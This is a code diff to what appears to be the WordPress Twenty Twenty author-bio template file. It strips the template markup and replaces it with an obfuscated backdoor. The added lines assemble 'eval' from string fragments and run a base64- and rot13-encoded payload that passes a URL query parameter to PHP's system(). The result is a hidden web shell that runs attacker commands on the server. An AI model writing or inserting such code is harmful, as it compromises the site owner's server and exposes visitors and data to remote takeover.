@@ -1,45 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * The template for displaying Author info
- *
- * @package WordPress
- * @subpackage Twenty_Twenty
- * @since Twenty Twenty 1.0
- */
-
-if ( (bool) get_the_author_meta( 'description' ) && (bool) get_theme_mod( 'show_author_bio', true ) ) :
-	?>
-<div class="author-bio">
-	<div class="author-title-wrapper">
-		<div class="author-avatar vcard">
-			<?php echo get_avatar( get_the_author_meta( 'ID' ), 160 ); ?>
-		</div>
-		<h2 class="author-title heading-size-4">
-			<?php
-			printf(
-				/* translators: %s: Author name. */
-				__( 'By %s', 'twentytwenty' ),
-				esc_html( get_the_author() )
-			);
-			?>
-		</h2>
-	</div><!-- .author-name -->
-	<div class="author-description">
-		<?php echo wp_kses_post( wpautop( get_the_author_meta( 'description' ) ) ); ?>
-		<a class="author-link" href="<?php echo esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ); ?>" rel="author">
-			<?php _e( 'View Archive <span aria-hidden="true">&rarr;</span>', 'twentytwenty' ); ?>
-		</a>
-	</div><!-- .author-description -->
-</div><!-- .author-bio -->
-	<?php
-endif;
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3VyIGdyemN5bmdyIHNiZSBxdmZjeW5sdmF0IE5oZ3ViZSB2YXNiCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBHanJhZ2xfR2pyYWdsCiAqIEBmdmFwciBHanJhZ2wgR2pyYWdsIDEuMAogKi8KCnZzICggKG9iYnkpIHRyZ19ndXJfbmhndWJlX3pyZ24oICdxcmZwZXZjZ3ZiYScgKSAmJiAob2JieSkgdHJnX2d1cnpyX3picSggJ2Z1YmpfbmhndWJlX292YicsIGdlaHIgKSApIDoKCT8+CjxxdmkgcHluZmY9XCJuaGd1YmUtb3ZiXCI+Cgk8cXZpIHB5bmZmPVwibmhndWJlLWd2Z3lyLWplbmNjcmVcIj4KCQk8cXZpIHB5bmZmPVwibmhndWJlLW5pbmduZSBpcG5lcVwiPgoJCQk8P2N1YyBycHViIHRyZ19uaW5nbmUoIHRyZ19ndXJfbmhndWJlX3pyZ24oICdWUScgKSwgMTYwICk7ID8+CgkJPC9xdmk+CgkJPHUyIHB5bmZmPVwibmhndWJlLWd2Z3lyIHVybnF2YXQtZnZtci00XCI+CgkJCTw/Y3VjCgkJCWNldmFncygKCQkJCS8qIGdlbmFmeW5nYmVmOiAlZjogTmhndWJlIGFuenIuICovCgkJCQlfXyggJ09sICVmJywgJ2dqcmFnbGdqcmFnbCcgKSwKCQkJCXJmcF91Z3p5KCB0cmdfZ3VyX25oZ3ViZSgpICkKCQkJKTsKCQkJPz4KCQk8L3UyPgoJPC9xdmk+PCEtLSAubmhndWJlLWFuenIgLS0+Cgk8cXZpIHB5bmZmPVwibmhndWJlLXFyZnBldmNndmJhXCI+CgkJPD9jdWMgcnB1YiBqY194ZnJmX2NiZmcoIGpjbmhnYmMoIHRyZ19ndXJfbmhndWJlX3pyZ24oICdxcmZwZXZjZ3ZiYScgKSApICk7ID8+CgkJPG4gcHluZmY9XCJuaGd1YmUteXZheFwiIHVlcnM9XCI8P2N1YyBycHViIHJmcF9oZXkoIHRyZ19uaGd1YmVfY2JmZ2ZfaGV5KCB0cmdfZ3VyX25oZ3ViZV96cmduKCAnVlEnICkgKSApOyA/PlwiIGVyeT1cIm5oZ3ViZVwiPgoJCQk8P2N1YyBfciggJ0l2cmogTmVwdXZpciA8ZmNuYSBuZXZuLXV2cXFyYT1cImdlaHJcIj4mZW5lZTs8L2ZjbmE+JywgJ2dqcmFnbGdqcmFnbCcgKTsgPz4KCQk8L24+Cgk8L3F2aT48IS0tIC5uaGd1YmUtcXJmcGV2Y2d2YmEgLS0+CjwvcXZpPjwhLS0gLm5oZ3ViZS1vdmIgLS0+Cgk8P2N1YwpyYXF2czsKCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
